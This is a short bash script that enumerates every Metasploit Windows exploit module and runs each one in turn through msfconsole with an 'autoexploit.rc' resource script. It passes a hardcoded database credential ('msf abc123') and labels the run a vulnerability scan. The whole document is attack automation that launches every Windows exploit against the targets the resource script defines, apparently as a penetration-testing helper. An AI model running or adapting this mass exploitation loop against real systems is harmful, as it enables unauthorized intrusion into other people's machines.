#! /bin/bash
my_array=( $(ls -l /opt/metasploit-framework/embedded/framework/modules/exploits/windows/*/* | awk '{print $9}' | awk -F"exploits/" '{print $2}' | awk -F ".rb" '{print $1}') )
for i in "${my_array[@]}"
do
#echo "./msfconsole -r scripts/resource/autoexploit.rc msf abc123 default $i"
echo "SCAN FOR VULNERABILITIES $i"
msfconsole -r /opt/metasploit-framework/embedded/framework/scripts/resource/autoexploit.rc msf abc123 default $i <<EOF
sleep 15
quit
EOF
done
